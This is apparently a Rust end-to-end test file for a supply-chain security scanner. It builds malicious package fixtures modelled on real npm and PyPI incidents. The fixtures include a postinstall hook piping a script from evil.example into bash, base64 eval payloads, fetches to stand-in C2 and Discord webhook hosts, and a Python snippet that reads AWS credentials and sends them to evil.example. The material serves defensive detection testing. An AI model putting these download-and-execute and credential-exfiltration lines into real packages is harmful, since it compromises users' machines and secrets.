//! End-to-end security scenarios: reconstruct the *shape* of real
//! supply-chain incidents as package fixtures and drive the `aegis` binary
//! against them, asserting the verdict/signals a security engineer expects.
//!
//! Network-free by design — every scenario is source/manifest based, so these
//! run deterministically in CI without touching OSV/registry. The goal is to
//! prove the scanner catches the *class* of attack, using fixtures modelled on
//! documented incidents (event-stream, ua-parser-js, the 2026 Shai-Hulud /
//! TanStack worm, obfuscated crypto-stealers, typosquats, binary droppers).

use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

const BIN: &str = env!("CARGO_BIN_EXE_aegis");

fn tmp(tag: &str) -> PathBuf {
    static SEQ: AtomicU64 = AtomicU64::new(0);
    let d = std::env::temp_dir().join(format!(
        "aegis-incident-{tag}-{}-{}",
        std::process::id(),
        SEQ.fetch_add(1, Ordering::Relaxed)
    ));
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn write(dir: &Path, name: &str, body: &str) {
    let p = dir.join(name);
    if let Some(parent) = p.parent() {
        std::fs::create_dir_all(parent).unwrap();
    }
    std::fs::write(p, body).unwrap();
}

struct Out {
    code: i32,
    stdout: String,
}

fn run(args: &[&str]) -> Out {
    let o = Command::new(BIN).args(args).output().unwrap();
    Out {
        code: o.status.code().unwrap_or(-1),
        stdout: String::from_utf8_lossy(&o.stdout).into_owned(),
    }
}

/// Scan a package directory offline and return its JSON report.
fn analyze(dir: &Path, eco: &str) -> Out {
    run(&[
        "analyze",
        dir.to_str().unwrap(),
        "--ecosystem",
        eco,
        "--json",
    ])
}

fn assert_verdict(out: &Out, verdict: &str) {
    assert_eq!(out.code, 0, "analyze failed: {}", out.stdout);
    assert!(
        out.stdout.contains(&format!("\"verdict\": \"{verdict}\"")),
        "expected verdict {verdict}, got:\n{}",
        out.stdout
    );
}

fn assert_signal(out: &Out, capability: &str) {
    assert!(
        out.stdout.contains(capability),
        "expected signal {capability} in:\n{}",
        out.stdout
    );
}

// --- npm incidents ----------------------------------------------------------

#[test]
fn incident_event_stream_malicious_postinstall() {
    // event-stream (2018): a transitive dep shipped a postinstall that ran an
    // obfuscated payload. Shape: install hook that downloads-and-executes.
    let d = tmp("eventstream");
    // event-stream's real payload was an obfuscated decode-then-execute blob;
    // combined with the malicious install hook it's an unambiguous block.
    write(
        &d,
        "index.js",
        "module.exports = require('./lib');\neval(atob('cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lkJyk='));\n",
    );
    write(
        &d,
        "package.json",
        r#"{
          "name": "flatmap-stream",
          "version": "0.1.1",
          "scripts": { "postinstall": "curl -sSL http://evil.example/p.sh | bash" }
        }"#,
    );
    let out = analyze(&d, "npm");
    assert_verdict(&out, "block");
    assert_signal(&out, "install-hook-suspicious");
    assert_signal(&out, "obfuscated-payload");
}

#[test]
fn incident_shai_hulud_tanstack_worm() {
    // 2026 "Shai-Hulud" / TanStack worm: an optionalDependency pinned to a git
    // commit SHA (worm propagation vector) plus the known-malware IOC filename
    // router_init.js smuggled into the tarball. Either alone is high-signal;
    // together it's an unambiguous block.
    let d = tmp("shaihulud");
    write(
        &d,
        "router_init.js",
        "// payload\nfetch('http://c2.example');\n",
    );
    write(
        &d,
        "package.json",
        r#"{
          "name": "@tanstack/react-router",
          "version": "1.169.5",
          "optionalDependencies": {
            "@tanstack/setup": "github:tanstack/router#79ac49eedf774dd4b0cfa308722bc463cfe5885c"
          }
        }"#,
    );
    let out = analyze(&d, "npm");
    assert_verdict(&out, "block");
    assert_signal(&out, "known-malware-ioc");
    assert_signal(&out, "git-dep-in-optional");
}

#[test]
fn incident_obfuscated_crypto_stealer() {
    // Classic crypto-stealer shape: decode-then-execute a base64 blob that
    // beacons to a Discord webhook (exfil host). Obfuscated-payload + the
    // suspicious-host URL together.
    let d = tmp("stealer");
    write(
        &d,
        "index.js",
        "const p = Buffer.from('Y3VybCBodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcw==','base64');\n\
         eval(atob('ZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMS9hYWEiKQ=='));\n",
    );
    write(
        &d,
        "package.json",
        r#"{"name":"leftpad-helper","version":"1.0.0"}"#,
    );
    let out = analyze(&d, "npm");
    // decode-then-exec is a strong signal on its own.
    assert_signal(&out, "obfuscated-payload");
    assert!(
        out.stdout.contains("\"verdict\": \"block\"")
            || out.stdout.contains("\"verdict\": \"prompt\""),
        "expected block/prompt, got:\n{}",
        out.stdout
    );
}

#[test]
fn incident_fromcharcode_obfuscated_url() {
    // Split-string / char-code obfuscation hiding a pastebin C2 URL — the
    // taint/constant-fold pass must see through String.fromCharCode.
    let codes = "https://pastebin.com/raw/evil"
        .chars()
        .map(|c| (c as u32).to_string())
        .collect::<Vec<_>>()
        .join(",");
    let d = tmp("charcode");
    write(
        &d,
        "index.js",
        &format!("const u = String.fromCharCode({codes});\nfetch(u);\n"),
    );
    write(&d, "package.json", r#"{"name":"x","version":"1.0.0"}"#);
    let out = analyze(&d, "npm");
    assert_signal(&out, "suspicious-url");
}

#[test]
fn incident_hardcoded_aws_secret() {
    // Leaked long-lived AWS credentials committed into a published package.
    let d = tmp("secret");
    // A real-shaped AWS access key id (not one of AWS's docs placeholders,
    // which the detector deliberately ignores to avoid tutorial false positives).
    write(
        &d,
        "config.js",
        "const AWS_ACCESS_KEY_ID = 'AKIAZ2XICEXAMPLE7QWE';\n",
    );
    write(
        &d,
        "package.json",
        r#"{"name":"acme-internal-config","version":"1.0.0"}"#,
    );
    let out = analyze(&d, "npm");
    assert_signal(&out, "hardcoded-secret");
}

#[test]
fn incident_binary_dropper_in_npm() {
    // A JS package that ships a native Windows executable — no legitimate npm
    // package needs a bundled .exe.
    let d = tmp("dropper");
    write(&d, "index.js", "module.exports = 1;\n");
    write(&d, "tools/setup.exe", "MZ\x00\x00binary");
    write(&d, "package.json", r#"{"name":"x","version":"1.0.0"}"#);
    let out = analyze(&d, "npm");
    assert_signal(&out, "binary-dropper");
}

#[test]
fn incident_unlisted_large_payload() {
    // A 600 KB code file smuggled into the tarball but not declared in the
    // package.json `files` allowlist — the TanStack router_init.js shape.
    let d = tmp("unlisted");
    write(
        &d,
        "package.json",
        r#"{"name":"x","version":"1.0.0","files":["dist"]}"#,
    );
    std::fs::write(d.join("payload.js"), "a".repeat(600_000)).unwrap();
    let out = analyze(&d, "npm");
    assert_signal(&out, "unlisted-large-file");
}

#[test]
fn incident_typosquat_of_popular_package() {
    // A package named a Levenshtein-hop from a hugely popular one — the
    // canonical install-time typo attack.
    let d = tmp("typo");
    write(&d, "index.js", "module.exports = 1;\n");
    write(&d, "package.json", r#"{"name":"loadsh","version":"1.0.0"}"#);
    // name-based heuristic: analyze uses the dir/--name; pass the squat name.
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--name",
        "loadsh",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert_signal(&out, "typosquat");
}

// --- python incident --------------------------------------------------------

#[test]
fn incident_pypi_exfil_stealer() {
    // PyPI crypto/credential stealer shape: read env, shell out, exfil over
    // urllib. Shell-spawn is the load-bearing signal.
    let d = tmp("pypi");
    write(
        &d,
        "setup_helper.py",
        "import os, urllib.request, base64\n\
         os.system('cat ~/.aws/credentials')\n\
         urllib.request.urlopen('http://evil.example/x?d=' + base64.b64encode(os.environ.get('AWS_SECRET_ACCESS_KEY','').encode()).decode())\n",
    );
    let out = analyze(&d, "pypi");
    assert_signal(&out, "shell-spawn");
}

// --- true negatives (no false positives) ------------------------------------

#[test]
fn clean_popular_package_is_safe() {
    // A legitimate package: registry dep, node-gyp rebuild hook, plain code.
    // Must NOT be flagged — false positives erode trust.
    let d = tmp("cleanpkg");
    write(
        &d,
        "index.js",
        "export function add(a, b) { return a + b; }\nexport const VERSION = '1.0.0';\n",
    );
    write(
        &d,
        "package.json",
        r#"{"name":"tiny-adder","version":"1.0.0","scripts":{"postinstall":"node-gyp rebuild"},"dependencies":{"lodash":"^4.17.21"}}"#,
    );
    let out = analyze(&d, "npm");
    assert_verdict(&out, "safe");
}

// --- fleet scan (run a mixed corpus) ----------------------------------------

#[test]
fn fleet_scan_flags_only_the_malicious_packages() {
    // A security engineer scanning a monorepo of vendored packages: the config
    // runner must fail overall (exit 1) while attributing the block to the
    // malicious task, not the clean one.
    let d = tmp("fleet");
    // malicious: shell-fetch in source
    write(
        &d.join("evil"),
        "a.js",
        "eval(atob('ZXZpbA=='));\nrequire('child_process').exec('id');\n",
    );
    // clean
    write(&d.join("good"), "b.js", "export const x = 1;\n");

    let cfg = format!(
        r#"
[[task]]
name = "vendored-evil"
path = "{p}/evil"
ecosystem = "npm"
checks = ["ast", "heuristics"]

[[task]]
name = "vendored-good"
path = "{p}/good"
ecosystem = "npm"
checks = ["ast", "heuristics"]
"#,
        p = d.to_str().unwrap()
    );
    write(&d, "aegis.toml", &cfg);

    let out = run(&["run", d.join("aegis.toml").to_str().unwrap(), "--json"]);
    assert_eq!(
        out.code, 1,
        "fleet scan should fail overall:\n{}",
        out.stdout
    );
    assert!(out.stdout.contains("\"failed\": true"), "{}", out.stdout);
    assert!(out.stdout.contains("vendored-evil"), "{}", out.stdout);
    assert!(out.stdout.contains("vendored-good"), "{}", out.stdout);
}

// --- live scenarios against ACTUAL published packages -----------------------
// These hit the real npm/OSV/GHSA registries, so they're #[ignore]d to keep CI
// deterministic + offline. Run explicitly:  cargo test -- --ignored
// They exercise the same code paths as the network-free scenarios above, but
// against real vulnerable/compromised package versions on the live registry.

#[test]
#[ignore = "live network: hits api.osv.dev"]
fn live_ci_gate_blocks_real_vulnerable_lodash() {
    // lodash 4.17.4 has multiple real published advisories (prototype pollution,
    // ReDoS). The CI gate must fail at --fail-on high against the live OSV feed.
    let d = tmp("live-ci");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.4"}}}"#,
    );
    let out = run(&[
        "ci",
        d.join("package-lock.json").to_str().unwrap(),
        "--fail-on",
        "high",
    ]);
    assert_eq!(
        out.code, 1,
        "expected CI failure on a real CVE:\n{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
#[ignore = "live network: hits registry.npmjs.org packument"]
fn live_analyze_flags_yanked_event_stream() {
    // event-stream@3.3.6 — the 2018 compromise — was yanked by npm after the
    // incident. `analyze --online` must surface it as version-unpublished.
    let d = tmp("live-es");
    write(&d, "index.js", "module.exports = 1;\n");
    write(
        &d,
        "package.json",
        r#"{"name":"event-stream","version":"3.3.6"}"#,
    );
    let out = run(&[
        "analyze",
        d.to_str().unwrap(),
        "--ecosystem",
        "npm",
        "--online",
        "--json",
    ]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("version-unpublished"),
        "expected version-unpublished for a real yanked package:\n{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}

#[test]
#[ignore = "live network: hits registry.npmjs.org + api.github.com"]
fn live_fix_plan_for_real_vulnerable_package() {
    // Against the live OSV feed, `fix` must produce a forward upgrade target for
    // a genuinely vulnerable version.
    let d = tmp("live-fix");
    write(
        &d,
        "package-lock.json",
        r#"{"lockfileVersion":3,"packages":{"node_modules/lodash":{"version":"4.17.4"}}}"#,
    );
    let out = run(&["fix", d.join("package-lock.json").to_str().unwrap()]);
    assert_eq!(out.code, 0);
    assert!(
        out.stdout.contains("lodash") && out.stdout.contains("npm install lodash@"),
        "expected an upgrade command:\n{}",
        out.stdout
    );
    let _ = std::fs::remove_dir_all(&d);
}
